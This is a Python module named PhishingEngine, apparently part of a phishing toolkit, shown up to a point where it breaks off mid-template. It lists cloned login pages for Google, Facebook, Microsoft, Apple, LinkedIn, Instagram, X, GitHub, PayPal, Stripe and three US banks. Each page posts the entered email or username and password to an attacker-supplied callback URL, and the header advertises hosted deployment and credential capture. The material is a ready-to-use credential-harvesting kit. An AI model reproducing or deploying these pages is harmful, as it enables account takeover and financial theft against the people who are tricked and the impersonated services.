"""
PhishingEngine — 40+ phishing templates for social engineering delivery.

Supports:
  - 44 pre-built templates across 9 categories
  - HTML template rendering with dynamic placeholders
  - Local HTTP serving
  - Cloudflare Pages deployment integration
  - Credential capture via callback
"""

import os
import json
import random
import string
import hashlib
import tempfile
import threading
from datetime import datetime
from typing import Optional, Dict, List, Any, Callable


# ── 44 PHISHING TEMPLATES ───────────────────────────────────────────

TEMPLATES = [
    # ── Login Portals ──────────────────────────────────────────────
    {
        "id": "google_login",
        "name": "Google Account Login",
        "category": "Login Portal",
        "description": "Cloned Google sign-in page. Captures email + password.",
        "brand": "Google",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title><style>body{font-family:Google Sans,Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{max-width:450px;width:100%;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;text-align:center}img.google-logo{width:75px;margin-bottom:20px}h1{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px}.subtitle{font-size:16px;color:#5f6368;margin-bottom:30px}.input-group{text-align:left;margin-bottom:20px}.input-group label{display:block;font-size:14px;color:#5f6368;margin-bottom:4px}.input-group input{width:100%;padding:12px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;transition:border-color .2s}.input-group input:focus{border-color:#1a73e8;outline:none}button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;cursor:pointer;float:right;margin-top:10px}button:hover{background:#1765cc}.footer{margin-top:40px;font-size:12px;color:#5f6368}.footer a{color:#1a73e8;text-decoration:none}.error{color:#d93025;font-size:14px;margin-bottom:16px;display:none}</style></head><body><div class="card"><img class="google-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 272 92'%3E%3Cpath fill='%23EA4335' d='M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/%3E%3Cpath fill='%23FBBC05' d='M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/%3E%3Cpath fill='%234285F4' d='M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z'/%3E%3C/svg%3E" alt="Google"><h1>Sign in</h1><p class="subtitle">Use your Google Account</p><form method="POST" action="{callback_url}"><div class="input-group"><label>Email or phone</label><input type="text" name="email" placeholder="Email or phone" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><div class="error" id="error">Wrong password. Try again or click Forgot password.</div><button type="submit">Next</button></form><div class="footer"><a href="#">Forgot email?</a> &bull; <a href="#">Create account</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "facebook_login",
        "name": "Facebook Login",
        "category": "Login Portal",
        "description": "Facebook login page clone. Captures email/phone + password.",
        "brand": "Facebook",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook - Log In or Sign Up</title><style>body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{display:flex;max-width:980px;width:100%;align-items:center;gap:60px}.left{flex:1}.left h1{color:#1877f2;font-size:56px;font-weight:700;margin:0}.left p{font-size:24px;color:#1c1e21;margin-top:10px}.right{flex:0 0 400px}.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;text-align:center}.card input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;box-sizing:border-box}.card input:focus{border-color:#1877f2;outline:none;box-shadow:0 0 0 2px #e7f3ff}button[name=login]{background:#1877f2;color:#fff;border:none;border-radius:6px;padding:14px;font-size:20px;font-weight:700;width:100%;cursor:pointer}button[name=login]:hover{background:#166fe5}.divider{border-bottom:1px solid #dadde1;margin:20px 0}.forgot{color:#1877f2;font-size:14px;text-decoration:none;display:block;margin:16px 0}.forgot:hover{text-decoration:underline}button[name=signup]{background:#42b72a;color:#fff;border:none;border-radius:6px;padding:14px;font-size:17px;font-weight:700;cursor:pointer;width:auto;padding-left:20px;padding-right:20px;margin:0 auto;display:inline-block}button[name=signup]:hover{background:#36a420}</style></head><body><div class="container"><div class="left"><h1>facebook</h1><p>Facebook helps you connect and share with the people in your life.</p></div><div class="right"><div class="card"><form method="POST" action="{callback_url}"><input type="text" name="email" placeholder="Email address or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" name="login">Log In</button></form><a class="forgot" href="#">Forgotten password?</a><div class="divider"></div><button name="signup" onclick="window.location.href='#'">Create new account</button></div></div></div></body></html>""",  # noqa
    },
    {
        "id": "microsoft_login",
        "name": "Microsoft 365 Login",
        "category": "Login Portal",
        "description": "Microsoft/Outlook/Office 365 login page.",
        "brand": "Microsoft",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to Microsoft 365</title><style>body{background:#f2f2f2;font-family:'Segoe UI',Segoe,Tahoma,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:440px;width:100%;padding:44px;border-radius:2px;box-shadow:0 2px 6px rgba(0,0,0,.2)}.logo{display:flex;align-items:center;margin-bottom:24px}.logo svg{width:108px;height:24px}h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 12px}.subtitle{font-size:15px;color:#1b1b1b;margin-bottom:24px}.input-group{margin-bottom:16px}.input-group label{display:block;font-size:13px;color:#616161;margin-bottom:4px}.input-group input{width:100%;padding:6px 10px;border:1px solid #8c8c8c;border-radius:2px;font-size:15px;box-sizing:border-box;height:36px}.input-group input:focus{border-color:#0067b8;outline:none}button{background:#0067b8;color:#fff;border:none;padding:6px 20px;font-size:15px;cursor:pointer;float:right;margin-top:16px;min-width:108px;height:32px}button:hover{background:#005da6}.links{margin-top:48px;font-size:13px}.links a{color:#0067b8;text-decoration:none;margin-right:16px}.links a:hover{text-decoration:underline}</style></head><body><div class="card"><div class="logo"><svg viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg><span style="margin-left:8px;font-size:20px;font-weight:600">Microsoft</span></div><h1>Sign in</h1><p class="subtitle">to continue to Microsoft 365</p><form method="POST" action="{callback_url}"><div class="input-group"><label>Email, phone, or Skype</label><input type="text" name="email" placeholder="someone@example.com" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign in</button></form><div class="links"><a href="#">Sign in options</a><a href="#">Create one!</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "apple_id",
        "name": "Apple ID Login",
        "category": "Login Portal",
        "description": "Apple ID sign-in page clone.",
        "brand": "Apple",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in with Apple ID</title><style>body{background:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:420px;width:100%;padding:48px 36px;border-radius:18px;box-shadow:0 0 0 1px rgba(0,0,0,.06),0 4px 12px rgba(0,0,0,.08);text-align:center}.apple-logo{margin-bottom:24px}h1{font-size:27px;font-weight:600;color:#1d1d1f;margin:0 0 8px;letter-spacing:-.3px}.subtitle{font-size:17px;color:#6e6e73;margin-bottom:32px}.input-group{margin-bottom:16px;text-align:left}.input-group label{display:block;font-size:14px;color:#1d1d1f;font-weight:500;margin-bottom:6px}.input-group input{width:100%;padding:12px 16px;border:1px solid #d2d2d7;border-radius:12px;font-size:17px;box-sizing:border-box;background:#f5f5f7;transition:all .2s}.input-group input:focus{border-color:#0071e3;background:#fff;outline:none;box-shadow:0 0 0 3px rgba(0,113,227,.2)}button{background:#0071e3;color:#fff;border:none;border-radius:980px;padding:12px 24px;font-size:17px;font-weight:600;width:100%;cursor:pointer;margin-top:8px}button:hover{background:#0077ed}.links{margin-top:24px;font-size:14px}.links a{color:#0071e3;text-decoration:none}.links a:hover{text-decoration:underline}</style></head><body><div class="card"><svg class="apple-logo" width="48" height="48" viewBox="0 0 48 48"><path d="M35.2 25.4c-.1-3.7 2-6.1 5.2-7.9-1.9-2.8-4.9-4.4-8.3-4.5-3.5-.1-6.8 2.1-8.6 2.1s-4.8-2-6.6-2c-4-.1-8.1 2.8-9.7 7-2.1 3.5-1.7 10.1 1.6 15.7 1.2 2 2.7 4.2 4.7 4.1 1.9-.1 2.6-1.3 4.9-1.3s2.9 1.3 4.9 1.3c2 .1 3.5-2 4.7-4 1.5-2.2 2.1-4.3 2.1-4.4-.1-.1-4.1-1.6-4.1-6.1zM28.1 12.5c1.1-1.4 1.9-3.3 1.6-5.3-1.6.1-3.6 1.1-4.8 2.6-1.1 1.4-2 3.3-1.7 5.2 1.8.1 3.6-.9 4.9-2.5z" fill="#1d1d1f"/></svg><h1>Sign in with Apple ID</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Apple ID</label><input type="email" name="email" placeholder="name@icloud.com" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign In</button></form><div class="links"><a href="#">Forgot Apple ID or password?</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "linkedin_login",
        "name": "LinkedIn Login",
        "category": "Login Portal",
        "description": "LinkedIn sign-in page.",
        "brand": "LinkedIn",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>LinkedIn Login</title><style>body{background:#f3f2ef;font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:32px;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.08);text-align:center}.logo{color:#0a66c2;font-size:40px;font-weight:700;margin-bottom:20px}h1{font-size:24px;font-weight:600;color:#191919;margin:0 0 24px}.input-group{margin-bottom:16px;text-align:left}.input-group input{width:100%;padding:14px 12px;border:1px solid rgba(0,0,0,.6);border-radius:4px;font-size:16px;box-sizing:border-box}.input-group input:focus{border-color:#0a66c2;outline:none}button{background:#0a66c2;color:#fff;border:none;border-radius:24px;padding:14px 24px;font-size:16px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#004182}.forgot{display:block;margin-top:16px;color:#0a66c2;font-size:14px;text-decoration:none}.divider{margin:24px 0;border-bottom:1px solid rgba(0,0,0,.15)}</style></head><body><div class="card"><div class="logo">LinkedIn</div><h1>Sign in</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="email" placeholder="Email or phone" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign in</button></form><a class="forgot" href="#">Forgot password?</a><div class="divider"></div></div></body></html>""",  # noqa
    },
    {
        "id": "instagram_login",
        "name": "Instagram Login",
        "category": "Login Portal",
        "description": "Instagram login page clone.",
        "brand": "Instagram",
        "difficulty": "Easy",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title><style>body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:350px;width:100%;padding:40px 40px 20px;border:1px solid #dbdbdb;border-radius:1px;text-align:center}.logo{font-family:Billabong,'Segoe UI',sans-serif;font-size:40px;margin-bottom:32px;color:#262626}h1{display:none}.input-group{margin-bottom:6px}.input-group input{width:100%;padding:9px 8px;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;background:#fafafa;box-sizing:border-box}.input-group input:focus{border-color:#a8a8a8;outline:none}.input-group input::placeholder{font-size:12px;color:#8e8e8e}button{background:#0095f6;color:#fff;border:none;border-radius:8px;padding:7px 16px;font-size:14px;font-weight:600;width:100%;cursor:pointer;margin-top:12px;opacity:.9}button:hover{opacity:1}.divider{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px}.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #dbdbdb}.divider span{padding:0 18px}.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:20px}.signup{background:#fff;max-width:350px;width:100%;padding:20px 40px;border:1px solid #dbdbdb;border-radius:1px;margin-top:10px;text-align:center;font-size:14px}.signup a{color:#0095f6;font-weight:600;text-decoration:none}</style></head><body><div><div class="card"><div class="logo">Instagram</div><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log In</button></form><div class="divider"><span>OR</span></div><a class="forgot" href="#">Forgotten your password?</a></div><div class="signup">Don't have an account? <a href="#">Sign up</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "twitter_login",
        "name": "Twitter/X Login",
        "category": "Login Portal",
        "description": "Twitter/X sign-in page.",
        "brand": "Twitter/X",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>X / Twitter</title><style>body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:#e7e9ea}.card{background:#000;max-width:400px;width:100%;padding:32px;border:1px solid #2f3336;border-radius:16px}.logo{text-align:center;margin-bottom:28px;font-size:32px}h1{font-size:17px;font-weight:700;margin-bottom:28px;text-align:center}.input-group{margin-bottom:20px}.input-group input{width:100%;padding:12px;border:1px solid #2f3336;border-radius:4px;font-size:15px;background:#000;color:#e7e9ea;box-sizing:border-box}.input-group input:focus{border-color:#1d9bf0;outline:none}button{background:#fff;color:#000;border:none;border-radius:9999px;padding:12px;font-size:15px;font-weight:700;width:100%;cursor:pointer}button:hover{background:#e6e6e6}.forgot{display:block;text-align:center;margin-top:16px;color:#1d9bf0;font-size:13px;text-decoration:none}</style></head><body><div class="card"><div class="logo">𝕏</div><h1>Sign in to X</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="email" placeholder="Phone, email, or username" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Next</button></form><a class="forgot" href="#">Forgot password?</a></div></body></html>""",  # noqa
    },
    {
        "id": "github_login",
        "name": "GitHub Login",
        "category": "Login Portal",
        "description": "GitHub sign-in page.",
        "brand": "GitHub",
        "difficulty": "Easy",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to GitHub</title><style>body{background:#f6f8fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Noto Sans,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:340px;width:100%;padding:20px;border:1px solid #d0d7de;border-radius:8px;box-shadow:0 8px 24px rgba(140,149,159,.2)}.logo{text-align:center;margin-bottom:24px}.logo svg{width:48px;height:48px}h1{font-size:24px;font-weight:300;text-align:center;color:#1f2328;margin:0 0 16px}.input-group{margin-bottom:16px}.input-group label{display:block;font-size:14px;font-weight:400;color:#1f2328;margin-bottom:4px}.input-group input{width:100%;padding:5px 12px;border:1px solid #d0d7de;border-radius:6px;font-size:14px;line-height:20px;box-sizing:border-box}.input-group input:focus{border-color:#0969da;outline:none;box-shadow:0 0 0 3px rgba(9,105,218,.3)}button{background:#2da44e;color:#fff;border:none;border-radius:6px;padding:5px 16px;font-size:14px;font-weight:500;width:100%;cursor:pointer;margin-top:8px}button:hover{background:#2c974b}.forgot{display:block;text-align:center;margin-top:16px;font-size:12px;color:#0969da;text-decoration:none}.create{text-align:center;margin-top:16px;font-size:12px;color:#656d76}.create a{color:#0969da;text-decoration:none}</style></head><body><div class="card"><div class="logo"><svg viewBox="0 0 24 24" fill="#1f2328"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></div><h1>Sign in to GitHub</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Username or email address</label><input type="text" name="username" placeholder="Username or email" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign in</button></form><a class="forgot" href="#">Forgot password?</a><div class="create">New to GitHub? <a href="#">Create an account</a></div></div></body></html>""",  # noqa
    },

    # ── Payment / Finance ─────────────────────────────────────────
    {
        "id": "paypal_login",
        "name": "PayPal Login",
        "category": "Payment",
        "description": "PayPal login page. Captures email + password.",
        "brand": "PayPal",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Log in to your PayPal account</title><style>body{background:#fff;font-family:PayPal Sans,Helvetica Neue,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{max-width:460px;width:100%;padding:48px 40px;text-align:center}.logo{margin-bottom:32px}h1{font-size:28px;font-weight:300;color:#2c2e2f;margin:0 0 8px}.subtitle{font-size:14px;color:#54575a;margin-bottom:32px}.input-group{margin-bottom:20px;text-align:left}.input-group label{display:block;font-size:14px;color:#2c2e2f;margin-bottom:4px;font-weight:500}.input-group input{width:100%;padding:12px 16px;border:1px solid #9da2a6;border-radius:24px;font-size:16px;box-sizing:border-box;transition:border-color .2s}.input-group input:focus{border-color:#0070ba;outline:none;box-shadow:0 0 0 2px rgba(0,112,186,.2)}button{background:#0070ba;color:#fff;border:none;border-radius:24px;padding:14px 24px;font-size:16px;font-weight:700;width:100%;cursor:pointer;margin-top:8px}button:hover{background:#005ea6}.links{margin-top:24px;font-size:13px}.links a{color:#0070ba;text-decoration:none;display:block;margin-bottom:8px}.links a:hover{text-decoration:underline}.footer{margin-top:48px;font-size:11px;color:#8a8e91}</style></head><body><div class="card"><div class="logo"><svg width="75" height="24" viewBox="0 0 150 48"><path d="M57.5 5.5h-11c-1.5 0-2.8 1.1-3.1 2.6l-4.5 28.5c-.1.8.5 1.6 1.3 1.6h6.5c1.5 0 2.8-1.1 3.1-2.6l1.2-7.5c.2-1.5 1.5-2.6 3.1-2.6h4.8c7.8 0 12.3-3.8 13.5-11.3 1.1-6.8-2.8-9.7-8.9-9.7zm2.3 10c-.5 3.5-3 3.5-5.5 3.5h-2.8l1-6.3c.1-.5.5-.8 1-.8h.8c1.8 0 3.5 0 4.4 1 .6.6.8 1.5 1.1 2.6z" fill="#0070ba"/><path d="M87.5 5.5h-11c-1.5 0-2.8 1.1-3.1 2.6l-4.5 28.5c-.1.8.5 1.6 1.3 1.6h7c.8 0 1.5-.6 1.6-1.4l1.2-7.8c.2-1.5 1.5-2.6 3.1-2.6h4.8c7.8 0 12.3-3.8 13.5-11.3 1.1-6.8-2.8-9.7-8.9-9.7zm2.3 10c-.5 3.5-3 3.5-5.5 3.5h-2.8l1-6.3c.1-.5.5-.8 1-.8h.8c1.8 0 3.5 0 4.4 1 .6.6.8 1.5 1.1 2.6z" fill="#003087"/><path d="M136.5 5.5h-11c-1.5 0-2.8 1.1-3.1 2.6l-4.5 28.5c-.1.8.5 1.6 1.3 1.6h7c.8 0 1.5-.6 1.6-1.4l1.2-7.8c.2-1.5 1.5-2.6 3.1-2.6h4.8c7.8 0 12.3-3.8 13.5-11.3 1.1-6.8-2.8-9.7-8.9-9.7zm2.3 10c-.5 3.5-3 3.5-5.5 3.5h-2.8l1-6.3c.1-.5.5-.8 1-.8h.8c1.8 0 3.5 0 4.4 1 .6.6.8 1.5 1.1 2.6z" fill="#001c64"/></svg></div><h1>Log in</h1><p class="subtitle">to your PayPal account</p><form method="POST" action="{callback_url}"><div class="input-group"><label>Email address</label><input type="email" name="email" placeholder="Email" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log In</button></form><div class="links"><a href="#">Having trouble logging in?</a><a href="#">Sign up</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "stripe_login",
        "name": "Stripe Dashboard Login",
        "category": "Payment",
        "description": "Stripe payment platform login page.",
        "brand": "Stripe",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Stripe - Dashboard Login</title><style>body{background:#f6f9fc;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:40px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,.08),0 2px 4px rgba(0,0,0,.04)}.logo{text-align:center;margin-bottom:32px;font-weight:600;font-size:24px;color:#635bff}h1{font-size:20px;font-weight:500;color:#32325d;margin:0 0 24px}.input-group{margin-bottom:20px}.input-group label{display:block;font-size:14px;font-weight:500;color:#32325d;margin-bottom:6px}.input-group input{width:100%;padding:12px;border:1px solid #e6e6e6;border-radius:4px;font-size:16px;box-sizing:border-box;background:#fafafa;transition:all .2s}.input-group input:focus{border-color:#635bff;background:#fff;outline:none;box-shadow:0 0 0 3px rgba(99,91,255,.1)}button{background:#635bff;color:#fff;border:none;border-radius:4px;padding:12px 16px;font-size:16px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#5a52e0}.links{margin-top:20px;text-align:center}.links a{color:#635bff;font-size:14px;text-decoration:none}</style></head><body><div class="card"><div class="logo">Stripe</div><h1>Sign in to your account</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Email</label><input type="email" name="email" placeholder="you@example.com" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign In</button></form><div class="links"><a href="#">Reset your password</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "bank_of_america",
        "name": "Bank of America Login",
        "category": "Payment",
        "description": "Bank of America online banking login.",
        "brand": "Bank of America",
        "difficulty": "Hard",
        "fields": ["online_id", "passcode"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bank of America | Online Banking</title><style>body{background:#e9e9e9;font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.card{background:#fff;max-width:440px;width:100%;padding:30px;border-radius:4px;box-shadow:0 0 6px rgba(0,0,0,.15)}.logo{background:#012169;color:#fff;padding:16px;text-align:center;font-size:22px;font-weight:700;letter-spacing:1px;margin:-30px -30px 24px -30px;border-radius:4px 4px 0 0}h1{font-size:16px;font-weight:700;color:#333;margin:0 0 20px}.input-group{margin-bottom:16px}.input-group label{display:block;font-size:13px;color:#555;margin-bottom:4px;font-weight:700}.input-group input{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;font-size:14px;box-sizing:border-box}.input-group input:focus{border-color:#012169;outline:none}.checkbox-group{margin-bottom:16px;font-size:12px;color:#555}.checkbox-group input{margin-right:6px}button{background:#012169;color:#fff;border:none;padding:12px 24px;font-size:14px;font-weight:700;width:100%;cursor:pointer;border-radius:3px}button:hover{background:#001a4f}.links{margin-top:16px;text-align:center}.links a{color:#012169;font-size:12px;text-decoration:underline;margin:0 8px}.footer{text-align:center;margin-top:24px;font-size:11px;color:#888}</style></head><body><div class="card"><div class="logo">Bank of America</div><h1>Sign in to Online Banking</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Online ID</label><input type="text" name="online_id" placeholder="Online ID" required></div><div class="input-group"><label>Passcode</label><input type="password" name="passcode" placeholder="Passcode" required></div><div class="checkbox-group"><input type="checkbox" name="save_id"> Save this Online ID</div><button type="submit">Sign In</button></form><div class="links"><a href="#">Forgot ID/Passcode?</a><a href="#">Enroll</a></div><div class="footer">© 2024 Bank of America Corporation</div></div></body></html>""",  # noqa
    },
    {
        "id": "wells_fargo",
        "name": "Wells Fargo Login",
        "category": "Payment",
        "description": "Wells Fargo online banking portal.",
        "brand": "Wells Fargo",
        "difficulty": "Hard",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Wells Fargo - Online Banking</title><style>body{background:#f4f4f4;font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:420px;width:100%;padding:30px 30px 20px;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.15)}.logo{color:#d71e28;font-size:28px;font-weight:700;margin-bottom:20px}h1{font-size:16px;font-weight:700;color:#333;margin:0 0 20px}.input-group{margin-bottom:16px}.input-group label{display:block;font-size:13px;color:#555;font-weight:700;margin-bottom:4px}.input-group input{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;font-size:14px;box-sizing:border-box}.input-group input:focus{border-color:#d71e28;outline:none}button{background:#d71e28;color:#fff;border:none;padding:12px;font-size:14px;font-weight:700;width:100%;cursor:pointer;border-radius:3px}button:hover{background:#b81a22}.links{margin-top:14px;text-align:center}.links a{color:#d71e28;font-size:12px;text-decoration:underline;margin:0 6px}.footer{text-align:center;margin-top:20px;font-size:11px;color:#888;border-top:1px solid #eee;padding-top:16px}</style></head><body><div class="card"><div class="logo">Wells Fargo</div><h1>Online Banking</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Username</label><input type="text" name="username" placeholder="Username" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign On</button></form><div class="links"><a href="#">Forgot Username/Password?</a><a href="#">Enroll</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "chase_bank",
        "name": "Chase Bank Login",
        "category": "Payment",
        "description": "Chase online banking login page.",
        "brand": "Chase",
        "difficulty": "Hard",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Chase - Sign In</title><style>body{background:#f2f2f2;font-family:ChaseSans,Helvetica Neue,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:32px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.12)}.logo{color:#1c3664;font-size:26px;font-weight:700;margin-bottom:28px;letter-spacing:-.5px}h1{font-size:20px;font-weight:500;color:#333;margin:0 0 24px}.input-group{margin-bottom:20px}.input-group label{display:block;font-size:13px;color:#666;font-weight:500;margin-bottom:4px}.input-group input{width:100%;padding:12px;border:1px solid #d4d4d4;border-radius:4px;font-size:15px;box-sizing:border-box}.input-group input:focus{border-color:#1c3664;outline:none;box-shadow:0 0 0 2px rgba(28,54,100,.15)}button{background:#1c3664;color:#fff;border:none;padding:14px;font-size:15px;font-weight:700;width:100%;cursor:pointer;border-radius:4px}button:hover{background:#152b50}.links{margin-top:16px;text-align:center}.links a{color:#1c3664;font-size:13px;text-decoration:underline;margin:0 10px}.footer{text-align:center;margin-top:24px;font-size:11px;color:#999}</style></head><body><div class="card"><div 